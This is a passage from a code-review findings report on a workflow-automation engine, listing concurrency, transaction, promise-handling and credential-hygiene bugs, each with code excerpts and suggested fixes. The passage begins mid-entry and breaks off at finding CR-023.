- **Suggested fix:** In `resetLoopEntry`, treat `skipped` like a success terminal: reset it to `pending` and continue the walk through it. Add a unit test covering two iterations of a decision inside a loop.
- **Effort:** S

### CR-008 [High] Merge-arena lock is per integration branch, but all branches of a parent share one working directory

- **Status at `abaa007`:** **Fixed** ([Task 20](review-tasks/20-merge-arena-and-workspaces.md))
- **Current location:** lib/engine/runtime/fanout/merge-arena.ts (withLock, ensureWorkspace, mergeStepBranch lock key, deleteStepBranch)
- **Re-verification note:** The lock key is still `${parentFlowId}:${integrationBranch}`, while the arena directory is one `${parentFlowId}-arena` per parent, and multi-branch plans still produce several integration branches (`integrationBranchFor(…, stepRow.branch)`). Concurrent approvals in different branch groups can therefore abort, reset or check out over each other, and the lazy clone races too. Lock on `parentFlowId` (including the lazy clone and `deleteStepBranch`), or use one arena or worktree per integration branch.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-03
- **Related:** CR-106 (DATA-15); CR-107 (ENG-45, DATA-16)
- **Location:** `lib/engine/merge-arena.ts:74-84`, `lib/engine/merge-arena.ts:88-99`, `lib/engine/merge-arena.ts:124`, `lib/engine/merge-arena.ts:155-157`
- **Problem:** The lock key is `${parentFlowId}:${integrationBranch}`, but the directory is `${parentFlowId}-arena` for every integration branch. Multi-branch plans produce several integration branches per parent (`integrationBranchFor(..., stepRow.branch)`). Two step approvals in different branch groups therefore run `merge --abort`, `reset --hard`, `checkout -B` and `merge` concurrently in the same checkout. One merge can wipe out or land on the other's branch, and `push` can publish the wrong tree. On first use, two concurrent `ensureWorkspace` calls both see no `.git` and both `git clone` into the same directory.
- **Evidence:**
  ```ts
  const key = `${args.parentFlowId}:${args.integrationBranch}`;
  ...
  const dir = path.join(config.workspace.dir(), `${parentFlowId}-arena`);
  ...
  try { await this.git(["-C", arena, "merge", "--abort"]); } catch { }
  try { await this.git(["-C", arena, "reset", "--hard"]); } catch { }
  ```
- **Suggested fix:** Lock on `parentFlowId`, since the directory is the shared resource. Alternatively, give each integration branch its own arena directory, or use `git worktree add` per branch. Make the lazy clone run under the same lock.
- **Effort:** S

### CR-009 [High] Fan-out rollup is not idempotent: it can publish twice and can regress an already-finished parent node

- **Status at `abaa007`:** **Fixed** ([Task 19](review-tasks/19-fanout-rollup-and-promises.md))
- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:544, 561-575 (onChildFinished), 578-591 (checkRollup), 603-660 (onAllResolved); lib/engine/flow-engine.ts:286-312 (finishFanout)
- **Re-verification note:** `checkRollup` is still fired with `void` from both `advance()` and `onChildFinished()`, has no in-flight guard, and `finishFanout` does an unconditional `UPDATE nodes SET status=…`, so a concurrent call can double-publish and a post-publish child retry can push an `approved` parent back to `awaiting_approval`. In addition, `onAllResolved` calls the engine's async `finishFanout` through an interface typed `void` (step-flow-manager.ts:145, 653), so `advanceFrom` errors after fan-out are unhandled rejections. Add a per-parent in-flight Set, make the terminal write `… AND status='running'` with an early return when `changes===0`, type `finishFanout` as `Promise<void>` and await it.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-04
- **Location:** `lib/engine/step-flows.ts:534`, `lib/engine/step-flows.ts:564-581`, `lib/engine/step-flows.ts:593-649`, `lib/engine/flow.ts:234-263`
- **Problem:** `checkRollup` is fired with `void` from both `advance()` and `onChildFinished()`. Neither it nor `finishFanout` checks whether the parent node is still `running`.
  - **Concurrent publish:** two callers both pass the "all resolved" check, both `await makeDiff` per branch, and both publish. The result is duplicate diff artifacts, two `finishFanout` writes, and two `advanceFrom` runs.
  - **Late regression:** after the aggregate is published (failed steps count as resolved), a user retries a failed step (`retryFanoutStep` → `retryNode` → `onChildFinished`). The rollup fires again and unconditionally `UPDATE nodes SET status='awaiting_approval'|'done'`. A parent that was already `approved` (for example the SDLC build after MR creation) reverts to `awaiting_approval` and re-runs `advanceFrom`.
- **Evidence:**
  ```ts
  void this.checkRollup(link.flow_id, parentNodeKey);
  ...
  db.run(
    `UPDATE nodes SET status=?, output=?, updated_at=? WHERE flow_id=? AND node_key=?`,
    status, JSON.stringify({ ...output, steps }), db.now(), parentFlowId, nodeKey);
  ```
- **Suggested fix:**
  1. Add a per-parent in-flight guard (a `Set` on the manager).
  2. Make the terminal transition conditional, `UPDATE ... WHERE ... AND status='running'`, and return early when `changes===0`.
  3. Decide explicitly what a post-publish child retry should do, for example re-open the parent to `running` first.
- **Effort:** M

### CR-010 [High] `skipFanoutStep` drops the promise of async `skipStepFlow`: errors are unhandled and the API reports success

- **Status at `abaa007`:** **Fixed** ([Task 19](review-tasks/19-fanout-rollup-and-promises.md))
- **Current location:** lib/engine/flow-engine.ts:1618-1620; lib/engine/runtime/fanout/step-flow-manager.ts:938; app/api/flows/[id]/action/route.ts:65
- **Re-verification note:** `skipFanoutStep` is still typed `void` and drops the promise from the async `skipStepFlow`, so the route answers `{ok:true}` immediately and validation throws become unhandled rejections. Make it `async … : Promise<void> { await stepFlows.skipStepFlow(…) }`. Enabling `@typescript-eslint/no-floating-promises` would also flag the `void checkRollup` / `finishFanout` drops in CR-009.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-05
- **Related:** CR-061 (ENG-16)
- **Location:** `lib/engine/flow.ts:1410-1412`, `lib/engine/step-flows.ts:928-966`, `app/api/flows/[id]/action/route.ts:63`
- **Problem:** `skipStepFlow` is `async`, and it throws on "plan step not found", "the step is already done" and "no fan-out node". It also awaits `cancelNode` and branch deletion. The engine wrapper is typed `void` and neither returns nor awaits the promise, so the route's `await fn()` resolves immediately and answers `{ok:true}`. Validation errors surface as process-level unhandled rejections, and the UI refetches before the skip has finished.
- **Evidence:**
  ```ts
  skipFanoutStep(parentFlowId: string, stepId: string): void {
    stepFlows.skipStepFlow(parentFlowId, stepId);
  }
  ```
- **Suggested fix:** `async skipFanoutStep(...): Promise<void> { await stepFlows.skipStepFlow(...); }`. Enabling `@typescript-eslint/no-floating-promises` would catch this class of bug.
- **Effort:** S

### CR-011 [High] Poller compares each branch's pipeline against the flow-wide last `pipeline` event, re-triggering the gate every tick

- **Status at `abaa007`:** **Fixed** (Task 21 — per-branch pipeline event lookup in `flow-poller.ts`)

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-06
- **Related:** CR-060 (ENG-15); CR-075 (NODE-09); CR-083 (NODE-17)
- **Location:** `lib/engine/poller.ts:56-63`, `lib/engine/poller.ts:112-139`
- **Problem:** With several branch MRs, `checkPipeline` runs once per branch, but `prev` is the latest `pipeline` event of the whole flow, whichever branch wrote it. Suppose branch A is `failed` and branch B is `success`. Every tick, A sees prev=`success` and B sees prev=`failed`, so both emit an event and A calls `triggerPipelineGate` again. The only guard is `chainBusy`, so as soon as the gate stops running (green, or failed after its fix budget) the next tick starts it again. The result is an endless fix-agent loop (real spend) and two feed events every 30 seconds per flow.
- **Evidence:**
  ```ts
  const prev = db.get<any>(
    `SELECT data FROM events WHERE flow_id=? AND type='pipeline' ORDER BY created_at DESC LIMIT 1`,
    f.id
  );
  const prevStatus = prev?.data ? JSON.parse(prev.data).status : null;
  if (pipe.status === prevStatus) return;
  ```
- **Suggested fix:** Scope the comparison per branch, for example `json_extract(data,'$.branchName') IS ?`. Better, track the last seen `(branch, pipeline id, status)` on `branches`/`flows`, and trigger the gate only on a transition to `failed` for a new pipeline id.
- **Effort:** S

### CR-012 [High] The DB façade has no transaction API, so no multi-step write in the engine is atomic

- **Status:** **Fixed** ([Task 12](review-tasks/12-db-transactions.md) — `Database.transaction`, engine/template multi-writes wrapped)

- **Severity:** High
- **Category:** Correctness (sources: ENG-07: Correctness; DATA-29: Boundaries)
- **Area:** Area 2 — Engine core & shared lib; Area 4 — DB, git, integrations
- **Source:** ENG-07, DATA-29 (merged duplicate)
- **Related:** CR-013 (ENG-08); CR-022 (DATA-02); CR-050 (APP-15); CR-066 (ENG-21); CR-067 (ENG-22); CR-071 (ENG-27); CR-192 (ENG-43); CR-210 (DATA-30)
- **Location:**
  - ENG-07: `lib/engine/flow.ts:114-136` (create), `lib/engine/flow.ts:195-211` (createStepChild), `lib/engine/flow.ts:469-474` (delete), `lib/engine/step-flows.ts:265-309` (expand), `lib/engine/steps.ts:165-195` (replace), `lib/engine/steps.ts:216-243` (replaceBranch), `lib/engine/templates.ts:379-391` (create), `lib/engine/templates.ts:500-528` (delete), `lib/engine/templates.ts:914-944` (writeNodesAndEdges), `lib/engine/templates.ts:446-461` (hand-rolled rollback)
  - DATA-29: `lib/db/index.ts:840-851`
- **Suggested fix (combined):** First add `Database.transaction<T>(fn: () => T): T` (synchronous callback, wraps `conn.transaction(fn)()`) in `lib/db/index.ts` (DATA-29). Then wrap each engine multi-write listed in ENG-07 (`create`, `createStepChild`, `delete`, `expand`, `steps.replace`/`replaceBranch`, template `create`/`delete`/`writeNodesAndEdges`) and delete the hand-rolled rollback in `duplicate()`. The primitive can ship alone as a tiny PR that unblocks the other transaction-related items.
- **Effort:** M (sources: ENG-07 M, DATA-29 S)

Original findings, verbatim:

#### ENG-07 (Area 2 — Engine core & shared lib): No multi-step DB write in the engine is atomic

- **Severity:** High
- **Category:** Correctness
- **Location:** `lib/engine/flow.ts:114-136` (create), `lib/engine/flow.ts:195-211` (createStepChild), `lib/engine/flow.ts:469-474` (delete), `lib/engine/step-flows.ts:265-309` (expand), `lib/engine/steps.ts:165-195` (replace), `lib/engine/steps.ts:216-243` (replaceBranch), `lib/engine/templates.ts:379-391` (create), `lib/engine/templates.ts:500-528` (delete), `lib/engine/templates.ts:914-944` (writeNodesAndEdges), `lib/engine/templates.ts:446-461` (hand-rolled rollback)
- **Problem:** better-sqlite3 offers `db.transaction()`, but nothing in `lib/` uses it.
  - If `nodeRegistry.resolve` throws partway through `create()`, a flow row is left with some of its nodes.
  - `steps.replace()` does `DELETE` all rows and then inserts one at a time, so one bad row wipes the checklist.
  - `writeNodesAndEdges({replace})` deletes the template graph before re-inserting it.
  - `delete()` removes ten tables one statement at a time.
  - `duplicate()` reimplements rollback by hand, which shows the need.
- **Evidence:**
  ```ts
  db.run(`DELETE FROM plan_steps WHERE flow_id=?`, flowId);
  steps.forEach((s, i) => {
    ...
    db.run(`INSERT INTO plan_steps (...) VALUES (...)`, ...);
  });
  ```
- **Suggested fix:** Add `Database.tx<T>(fn: () => T): T` wrapping `conn.transaction(fn)()` in `lib/db`. Wrap each listed method body in it. Delete the manual rollback in `duplicate()`.
- **Effort:** M

#### DATA-29 (Area 4 — DB, git, integrations): The DB façade exposes no transaction API — zero `transaction()` usages repo-wide

- **Severity:** Medium
- **Category:** Boundaries
- **Location:** `lib/db/index.ts:840-851`
- **Problem:** `Database` offers only `get/all/run`. A search finds no `.transaction(` anywhere in `lib/` or `app/`, so every multi-statement write in the engine (flow creation with nodes, plan-step refresh, step merges, removal records) runs non-atomically. A crash or exception mid-sequence leaves orphaned or partial rows. The engine call sites are owned by other areas, but the missing primitive is here.
- **Evidence:**
  ```ts
  run(sql: string, ...args: any[]) {
    return this.connection().prepare(sql).run(...args);
  }
  ```
- **Suggested fix:** Add `transaction<T>(fn: () => T): T { return this.connection().transaction(fn)(); }`, with a comment that the callback must stay synchronous for better-sqlite3. Point the engine reviewers at it for multi-write services.
- **Effort:** S

### CR-013 [High] Plan-checklist bulk edit reopens done steps and drops agent `meta_id`, so the next refine duplicates the checklist

- **Status at `abaa007`:** **Fixed (Task 27)**

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-08
- **Related:** CR-012 (ENG-07, DATA-29) — fix CR-012 first: make the checklist replace atomic; CR-192 (ENG-43)
- **Location:** `lib/engine/steps.ts:155-184`, `lib/engine/steps.ts:68-78`, `lib/engine/flow.ts:666-710`
- **Problem:** In `replace()`, a matched row is preserved only when it is `pending` and has a `sub_flow_id`. Every other row is re-inserted as `status='pending'`, `origin='user'`, `meta_id=NULL`. On an ordinary whole-mode flow, a simple retitle in the Plan editor therefore:
  1. Re-opens every step already checked off, manually or by the build's progress report.
  2. Turns every agent step into a user step with no `meta_id`. `syncFromPlan` matches only `origin='agent'` rows by `meta_id`, so the next refine inserts every planner step again next to the old rows, duplicating the checklist.
  `PlanStepInput` carries no status, so the caller cannot preserve it.
- **Evidence:**
  ```ts
  if (prev.status !== "pending" || !prev.sub_flow_id) continue;
  preserve.set(i, { subFlowId: prev.sub_flow_id, metaId: prev.meta_id });
  ...
  VALUES (?,?,?,?,?,?,?,?,?,'pending','user',?,?,?)
  ...
  p?.metaId ?? null,
  ```
- **Suggested fix:** For every matched row, carry over `status`, `completed_by`, `origin`, `meta_id` and `sub_flow_id` from `prev` (update in place instead of delete and re-insert). Only unmatched input rows should become `pending`/`user`. Add a store test covering edit followed by `syncFromPlan`.
- **Effort:** M

### CR-014 [High] When the late-write guard fires, callers still finalize, which brings cancelled nodes back and overwrites state

- **Status at `abaa007`:** **Fixed** ([Task 16](review-tasks/16-run-lifecycle-late-writes.md))
- **Current location:** lib/engine/harness/agent-runner.ts; lib/engine/nodes/shared/agent-run-node.ts (execute); lib/engine/nodes/shared/node-definition.ts (applyOutcome); lib/engine/nodes/kinds/plan/plan-contract.ts (turnRetry); lib/engine/nodes/kinds/pipeline/pipeline-node.ts (runFix)
- **Re-verification note:** The late-write guard still returns `result` exactly as on success, so `execute()` runs `finalize`, then `applyOutcome` writes the final status over a cancelled node. Plan's retry path, resolve's host-side comment resolution and pipeline's fix artifact all still run. Throw a typed `RunSupersededError` (or return a discriminated result), catch it in `execute()`, the plan turn and the pipeline fix to stop with no write, and add a "still running?" check in `applyOutcome`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-01
- **Related:** CR-015 (NODE-02); CR-055 (ENG-10); CR-081 (NODE-15); CR-092 (NODE-26)
- **Location:** `lib/engine/nodes/base/agent-runner.ts:176-182`, `lib/engine/nodes/base/node-definition.ts:256-268`, `lib/engine/nodes/plan/plan-node.ts:887-915,386-389`, `lib/engine/nodes/pipeline/pipeline-node.ts:585-612`, `lib/engine/nodes/resolve/resolve-node.ts:138-149`
- **Problem:** `executeRun` notices that the node is no longer `running` (the user cancelled it, or reconcile failed it) and returns the result exactly as it does on success. No caller can tell the difference:
  - `execute()` goes on to call `finalize`, saves the artifact, and writes the final status (`done`/`awaiting_approval`) over the user's `failed`.
  - Plan goes further: it may start a *second* (retry) agent run on the cancelled node, then calls `persistPlan`, which runs `planSteps.syncFromPlan` and replaces the user's checklist.
  - Resolve marks comments resolved on the git host.
  - Pipeline's `runFix` saves a "fix" artifact and logs "fix pushed".

  The guard's own comment says it exists to prevent exactly this.
- **Evidence:**
  ```ts
  if (nodeNow?.status !== "running") {
    db.emitEvent(..., `${label} result arrived after the node was already ...— ignoring`);
    return result;            // indistinguishable from success
  }
  // node-definition.ts execute():
  const result = await this.runner.executeRun(ctx, node.id, start, opts.label);
  const outcome = await opts.finalize(result);   // runs anyway
  ```
- **Suggested fix:** Throw a typed `RunSupersededError` from the guard, or return a discriminated `{ superseded: true }`. Catch it in `execute()`, the plan's `generatePlan`, pipeline `runFix` and the `bg()` wrapper, and stop silently with no status write. Add the same "still running?" check to `applyOutcome()`, which http, script and decision use.
- **Effort:** M

### CR-015 [High] Runs have no attempt identity, so overlapping attempts on one node both treat it as theirs

- **Status at `abaa007`:** **Fixed** (Task 17 — atomic `claim` / `attempt_id`; PR link TBD)
- **Current location:** lib/engine/harness/agent-runner.ts:176-177; lib/engine/nodes/shared/node-support.ts:80-89 (persistRun closes every running row); lib/engine/nodes/kinds/pipeline/pipeline-node.ts:348-349; lib/engine/flow-engine.ts:1726-1746 (sendChat has no running check)
- **Re-verification note:** Guards still check only `nodes.status === 'running'`, and there is no attempt or run-sequence identity. After cancel then retry, or a chat sent mid-run, old runs or poll loops treat the node as theirs, and `persistRun` marks a still-streaming run row as `error`. Stamp an attempt token when a node goes `running`, pass it to `executeRun` and the pipeline loop, guard on token equality, and make `sendChat` refuse when the node is already running.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-02
- **Related:** CR-014 (NODE-01); CR-054 (ENG-09); CR-056 (ENG-11); CR-082 (NODE-16); CR-092 (NODE-26)
- **Location:** `lib/engine/nodes/base/agent-runner.ts:176-177`, `lib/engine/nodes/base/node-support.ts:55-65`, `lib/engine/nodes/pipeline/pipeline-node.ts:322-328,516-517`, `lib/engine/nodes/plan/plan-node.ts:334-335`
- **Problem:** The guard and the pipeline poll loop only check `nodes.status === 'running'`. Consider cancel followed by retry (`cancelNode` sets `failed`, then `retryNode` sets `running`), or a chat sent while the node is running (`sendChat` doesn't check). In both cases the old in-flight run or poll loop sees `running` again and carries on:
  - Two pipeline loops poll at once and each starts fix agents, pushing duplicate fixes.
  - Two agent runs both finalize; the old one can stamp its artifact/output onto the new attempt.
  - `persistRun` marks *every* `running` run row of the node as `error`, including a run that is still streaming. Its row is then wrong and cost/usage gets attributed to a closed row.
- **Evidence:**
  ```ts
  // pipeline-node.ts
  const statusNow = db.get(`SELECT status FROM nodes WHERE id=?`, node.id)?.status;
  if (statusNow !== "running") throw new Error("pipeline wait cancelled");
  // node-support.ts persistRun
  db.run(`UPDATE runs SET status='error' ... WHERE node_id=? AND status='running'`, ...);
  ```
- **Suggested fix:** Give each node attempt a token (`attempt_id`/`run_seq`), written when `running` is set and passed to `executeRun` and the pipeline loop. Guard on `token === current`, not on status. Have `persistRun` close only rows from earlier attempts. Make `sendChat`/`run()` refuse when the node is already running.
- **Effort:** M

### CR-016 [High] The script node passes the server's whole `process.env` to user scripts, contrary to its "allowlisted env" contract

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/engine/nodes/kinds/script/script-node.ts:336-345 (execa call), 254 (childEnv), 31 (doc claims allowlist)
- **Re-verification note:** `execa` (still 10.2.1) is called with `env: opts.env` and no `extendEnv: false`, so the whole server `process.env` (Cursor key, git tokens and so on) is merged under the allowlist for every script node. Pass `extendEnv: false` and add a test asserting that a non-allowlisted variable is absent in the child.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-03
- **Related:** CR-117 (DATA-27)
- **Location:** `lib/engine/nodes/script/script-node.ts:338-347`, `lib/engine/nodes/script/script-node.ts:252-271`
- **Problem:** `childEnv()` builds an allowlist (PATH, HOME, declared names, DEVFLOW_*). But execa 10.2.1 defaults to `extendEnv: true` (`node_modules/execa/lib/arguments/options.js:83`), which merges `process.env` underneath it. Every server secret (git host tokens, Cursor API key, etc.) is therefore visible to any script node. That includes scripts from imported YAML templates or webhook-started flows. The class doc promises "env is allowlisted".
- **Evidence:**
  ```ts
  const res = await execa(bin, args, {
    input: opts.input, timeout: opts.timeoutMs, cwd: opts.cwd,
    env: opts.env,            // merged over process.env (extendEnv defaults to true)
    killSignal: "SIGKILL", stripFinalNewline: false, reject: false, windowsHide: true,
  });
  ```
- **Suggested fix:** Pass `extendEnv: false` and add a test asserting that a variable outside the allowlist is absent in the child.
- **Effort:** S

### CR-017 [High] Multi-branch resolve picks up and resolves comments from every MR in the flow

- **Status at `abaa007`:** **Fixed** (Task 21 — `ingestComments` stores `mr_iid`; `openComments(flowId, mrIid)`)

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-04
- **Related:** CR-083 (NODE-17)
- **Location:** `lib/engine/nodes/resolve/resolve-node.ts:68-70`, `lib/engine/nodes/resolve/resolve-node.ts:139-148`
- **Problem:** The open-comments query filters only on `flow_id`, even though `comments.mr_iid` exists and the run is scoped to `input.branchName`/`mrIid`. A resolve for branch A:
  - puts branch B's comments into A's prompt;
  - calls `resolveComment(repo, mrIid_A, discussion_of_B)`, which is the wrong MR;
  - marks B's comments `resolved` locally, so B never gets fixed.
- **Evidence:**
  ```ts
  const open = db.all<...>(
    `SELECT * FROM comments WHERE flow_id=? AND status IN ('open')`, ctx.flow.id
  );
  ```
- **Suggested fix:** Add `AND mr_iid=?` (bound to the resolved `mrIid`) and make sure the comment ingester stores `mr_iid` (it's `null` at `flow.ts:1790`; flag that to the area owner). Move the query into a `CommentStore` method.
- **Effort:** S

### CR-018 [High] A plan refine from chat drops `complex`, which wipes a complex plan's branches

- **Status at `abaa007`:** **Fixed**
- **Re-verification note:** The plan node was rewritten around unified turns (`PlanNode.chat` delegates to `turn`, see plan-node.ts:146-200): there is no `complex` flag, simple template or `parseSimple` any more, and every whole-plan apply persists `branches: plan.branches ?? []` through one schema (plan-contract.ts:281-299), so a chat refine no longer strips branches.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-05
- **Location:** `lib/engine/nodes/plan/plan-node.ts:1045-1052`
- **Problem:** The plan exposes `refinable: true` / `chatOnlyMode: "refine"`, so the chat panel's refine toggle sends messages to `PlanNode.chat()`. That method builds a fresh input of `{feedback, model}`, so `complex` falls back to `false`. The refine then:
  - uses the simple `plan_refine` template;
  - parses with `parseSimple`, whose Zod object strips `branches`;
  - saves `branches: []` and re-syncs the checklist.

  A complex multi-branch plan silently turns into a simple one. `refinePlan()` in `flow.ts:628-647` passes `complex`; the chat path doesn't.
- **Evidence:**
  ```ts
  override async chat(ctx, content, model) {
    const outcome = await this.run(ctx,
      this.inputSchema.parse({ feedback: content, model: model ?? null }),  // complex → false
      this.nodeConfig(ctx));
  ```
- **Suggested fix:** Carry `complex` over from the recorded input (`node.input`) or from the latest artifact's `output.complex`. Consider carrying `decompose` too. Add a test that a chat refine of a complex plan keeps its branches.
- **Effort:** S

### CR-019 [High] MR creation forces the pipeline and review nodes to `pending` even while they are running, and throws when they don't exist

- **Status at `abaa007`:** **Fixed** (Task 21 — `resetGateReview` once after multi-branch MR loop; skip `running`)

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-06
- **Location:** `lib/engine/nodes/merge-request/merge-request-service.ts:124-127`
- **Problem:** After creating or reusing the change request, `create()` sets `pipeline` and `review` to `pending` unless they already are. This includes `running`:
  - In multi-branch flows, `approveBuild` calls `create()` once per branch. Creating branch 2's MR flips the gate running for branch 1 to `pending`, its poll loop throws "pipeline wait cancelled", and `bg` marks it `failed`.
  - `nodeByKey(NODE_KEYS.PIPELINE)` throws for templates whose gate has a different instance key or that have no review node. That happens *after* the MR was created, so the user sees "MR creation failed" while the MR exists.
- **Evidence:**
  ```ts
  for (const key of [NODE_KEYS.PIPELINE, NODE_KEYS.REVIEW] as const) {
    const n = nodeSupport.nodeByKey(flow.id, key);
    if (n.status !== "pending") nodeSupport.setNode(n.id, { status: "pending" });
  }
  ```
- **Suggested fix:** Have the caller pass the chain's node keys in (resolved through `gateKey`/`firstKeyOfType`) instead of using built-in key literals. Skip nodes that are `running`. Do the reset once after all branches' MRs exist, not per branch.
- **Effort:** S

### CR-020 [High] For multi-branch flows, the commit-fix agent runs on the wrong branch

- **Status at `abaa007`:** **Fixed** (Task 21 — commit-fix passes `branchInfo`; refine uses plan branch git ref)

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-07
- **Related:** CR-083 (NODE-17)
- **Location:** `lib/engine/nodes/sdlc/chain.ts:109-136`, `lib/engine/nodes/build/build-node.ts:286-347`
- **Problem:** `runBuildCommitFix` receives the rejected `branch` but never uses it. It calls `runNode(build, {branchInfo: null, feedback})`, and `BuildNode.refine()` works on `ctx.flow.mr_branch`, which is the *last-built* branch. When branch A's push is rejected, the fix agent edits branch C. A's next push is rejected again until the attempts run out, and C picks up unrelated "fix" commits.
- **Evidence:**
  ```ts
  private async runBuildCommitFix(flowId, buildKey, gate, branch, attempt, maxAttempts, error) {
    ...
    await this.host.runNode(flowId, buildKey, {
      plan: null, prompt: null, branchInfo: null, model: null, feedback: ...,
  ```
- **Suggested fix:** Pass `branchInfo: { name: branch }` when `branch` is set. Make `refine()` resolve the git branch from `branchInfo` (with the same naming function as the build) instead of `flow.mr_branch`.
- **Effort:** S

### CR-021 [High] DB connection is cached before schema/migrations finish — a failed migration is never retried and the app runs half-migrated

- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — bootstrap opens into a pending handle, assigns `conn` only on success, throws `DatabaseMigrationError` on failure)
- **Current location:** lib/db/index.ts:38-55
- **Re-verification note:** `this.conn` is still assigned before `renameTicketsToTasks`, `exec(schema)` and `migrate()` run, so a failed migration leaves a cached, half-migrated handle for every later caller. Open into a local, run bootstrap and migrations, assign `this.conn` only on success, and otherwise `close()` and throw a typed `DatabaseMigrationError`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-01
- **Related:** CR-022 (DATA-02); CR-046 (APP-10, ENG-28); CR-158 (TOOL-05); CR-211 (DATA-31); CR-221 (DATA-41)
- **Location:** `lib/db/index.ts:37-55`
- **Problem:** `this.conn` is assigned right after opening the file, before `renameTicketsToTasks`, `exec(schema)` and `migrate()` run. If any of those throws (locked DB, leftover `tasks_new` from DATA-02 (CR-022), bad seed), the first caller gets the error, but every later `connection()` call returns the cached, partially-migrated handle (`if (this.conn) return this.conn`). Queries then fail far from the cause (missing columns), or worse, succeed against the wrong shape.
- **Evidence:**
  ```ts
  if (this.conn) return this.conn;
  ...
  this.conn = new SqliteDatabase(file);
  this.conn.pragma("journal_mode = WAL");
  this.renameTicketsToTasks(this.conn);
  ...
  this.conn.exec(schema);
  this.migrate(this.conn, schema);
  return this.conn;
  ```
- **Suggested fix:** Open into a local variable, run bootstrap and migrations, and assign `this.conn` only on success. On failure, `close()` the handle and rethrow a typed `DatabaseMigrationError`.
- **Effort:** S

### CR-022 [High] Migrations and seeding are not atomic; table rebuilds are not resumable after a crash

- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — legacy table rebuilds removed; `seedTemplates` runs inside the version-1 migration transaction)
- **Current severity:** Medium (was High)
- **Current location:** lib/db/index.ts:588-660 (seedTemplates, non-atomic SDLC template seed); legacy-only parts: lib/db/index.ts:64-70, 82-84, 198-208, 466-494, 547-580
- **Re-verification note:** Still applies for the current flow only in part (b): `seedTemplates` inserts `tpl_sdlc_loop`, then its nodes and edges, as separate statements, so a crash in between makes the `hasSdlc` check permanently skip node seeding. Wrap each template seed in one transaction. Parts (a) and (c) concern legacy migrations (tickets→tasks rename, the `tasks_new`/`flows_new` FK and column rebuilds, `pipeline_fix` cleanup). That code still exists and should be deleted as a legacy cleanup task rather than hardened.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-02
- **Related:** CR-012 (ENG-07, DATA-29) — fix CR-012 first: use the shared transaction primitive; CR-021 (DATA-01); CR-158 (TOOL-05); CR-210 (DATA-30); CR-211 (DATA-31)
- **Location:** `lib/db/index.ts:73-242`, `lib/db/index.ts:470-476`, `lib/db/index.ts:546-564`, `lib/db/index.ts:590-611`, `lib/db/index.ts:809-828`
- **Problem:** `migrate()` runs dozens of DDL/DML statements with no transaction. There are zero `.transaction(` calls anywhere in `lib/` or `app/`. Concrete failure modes:
  - (a) A crash between `CREATE TABLE tasks_new` and `ALTER TABLE tasks_new RENAME TO tasks` leaves `tasks_new` behind. The next boot runs `CREATE TABLE tasks_new` again (no `IF NOT EXISTS`, the code strips it) and throws, so the app can never start. The same applies to `flows_new`.
  - (b) `seedTemplates` inserts the `tpl_sdlc_loop` row, then its nodes and edges, as separate statements. A crash in between makes the next boot see `hasSdlc` and never seed the nodes, which permanently breaks the built-in template.
  - (c) The legacy `pipeline_fix` delete loop can leave artifacts deleted but nodes present.
- **Evidence:**
  ```ts
  d.exec(
    def.replace("IF NOT EXISTS ", "").replace("CREATE TABLE tasks", "CREATE TABLE tasks_new")
  );
  ...
  d.exec(`DROP TABLE tasks`);
  d.exec(`ALTER TABLE tasks_new RENAME TO tasks`);
  ```
- **Suggested fix:** Wrap each migration step in `d.transaction(() => …)()`. Do the FK toggle outside the transaction, because `PRAGMA foreign_keys` is a no-op inside one. Add `DROP TABLE IF EXISTS tasks_new/flows_new` guards before each rebuild. Make `seedTemplates` one transaction per template.
- **Effort:** M

### CR-023 [High] GitLab token embedded in git clone/push URLs leaks into error text, the event log, `step_merges.error` and on-disk `.git/config` (local clones and merge arena)

- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
- **Current location:** lib/integrations/gitlab/git-host.ts:188-203 (oauth2:<token>@ URL); lib/engine/ports/git-host.ts:278-282; lib/git/local.ts:57-60, 77 (clone persists token in .git/config), 161, 170 (push error message interpolated, 300 chars); lib/engine/runtime/fanout/merge-arena.ts:91-94 (arena clone), 221-258, 289-293 (errorText unredacted into step_merges.error/events)
- **Re-verification note:** Clone and push URLs still embed `oauth2:<TOKEN>@`, which persists the token in every workspace's and arena's `.git/config`. `pushBranch` and merge-arena `errorText` still forward raw git messages and stderr into events and `step_merges.error` with no redaction. Supply credentials out of band (`GIT_CONFIG_*` `http.extraHeader` or `GIT_ASKPASS`), clone with plain URLs, add one shared redaction pass in both git wrappers, and rewrite existing `remote.origin.url`s.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations; Area 2 — Engine core & shared lib
- **Source:** DATA-03, ENG-25 (merged duplicate)
- **Status:** Needs verification
  - ENG-25: "Whether git echoes the credentialed URL in fetch and push errors depends on the git version, so that part needs verification."
- **Related:** CR-186 (ENG-37); CR-214 (DATA-34)
- **Location:**
